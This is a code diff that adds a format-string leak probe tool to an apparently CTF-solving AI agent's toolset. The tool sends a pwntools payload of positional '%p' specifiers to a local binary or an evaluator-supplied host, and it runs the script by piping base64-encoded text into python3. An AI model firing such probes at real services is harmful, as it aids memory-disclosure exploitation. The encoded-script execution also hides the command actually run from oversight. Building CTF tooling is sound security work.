@@ -8,6 +8,7 @@ session.
 
 from __future__ import annotations
 
+import base64
 import re
 import shlex
 from urllib.parse import urlsplit
@@ -269,6 +270,62 @@ def make_run_exploit(*, env: CTFEnvironment, state=None, **_) -> object:
         return _result_text(await env.exec(command, timeout=timeout_seconds + 15))
 
     return run_exploit
+
+
+@register_tool(name="fmtstr_probe", groups=["pwn"])
+def make_fmtstr_probe(*, env: CTFEnvironment, state=None, **_) -> object:
+    from langchain_core.tools import tool
+
+    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")
+
+    @tool
+    async def fmtstr_probe(
+        mode: str = "local",
+        binary: str = "",
+        prompt: str = "",
+        start_index: int = 1,
+        end_index: int = 40,
+    ) -> str:
+        """Send one bounded positional format-string leak probe.
+
+        The payload begins with ``AAAABBBB`` and prints indexed pointers between
+        ``start_index`` and ``end_index``. Use the marker value and surrounding
+        pointers to determine the controlled argument index and address classes.
+        Target mode is bound to the evaluator-provided endpoint.
+        """
+        if mode not in {"local", "target"}:
+            raise ValueError("mode must be local or target")
+        if start_index < 1 or end_index < start_index or end_index > 100:
+            raise ValueError("format-string index range must be within 1..100")
+        host = ""
+        port = 0
+        if mode == "local":
+            if not binary:
+                raise ValueError("local mode requires a binary")
+        else:
+            if not remote or ":" not in remote:
+                raise ValueError("target mode requires an evaluator-provided host:port")
+            host, raw_port = remote.rsplit(":", 1)
+            if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
+                raise ValueError("the evaluator-provided target is not host:port")
+            port = int(raw_port)
+        program = f"""from pwn import *
+context.log_level = 'error'
+io = process({binary!r}) if {mode!r} == 'local' else remote({host!r}, {port})
+if {prompt!r}:
+    io.recvuntil({prompt!r}.encode())
+payload = b'AAAABBBB|' + b'|'.join(f'%{{i}}$p'.encode() for i in range({start_index}, {end_index + 1})) + b'|END'
+io.sendline(payload)
+data = io.recvrepeat(2)
+print(data.decode(errors='replace'))
+print('[payload_hex]', payload.hex())
+io.close()
+"""
+        encoded = base64.b64encode(program.encode()).decode()
+        command = f"printf %s {encoded} | base64 -d | python3 -"
+        return _result_text(await env.exec(command, timeout=45))
+
+    return fmtstr_probe
 
 
 @register_tool(name="r2_interact", groups=["reverse", "pwn"])
